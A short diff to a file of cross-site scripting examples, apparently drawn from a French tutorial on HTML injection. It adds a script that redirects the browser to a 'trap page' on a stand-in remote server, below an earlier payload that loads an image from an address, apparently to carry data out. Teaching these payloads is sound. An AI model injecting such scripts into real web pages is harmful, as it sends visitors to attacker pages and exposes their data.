@@ -19,3 +19,8 @@ https://apcpedagogie.com/les-injections-html-xss/
   imgTag.setAttribute("src",addr) ;
   document.body.appendChild(imgTag) ;
 </script>
+
+
+<script type="text/javascript">
+  document.location = "http://www.serveur-distant.net/page-piege.php" ;
+</script>
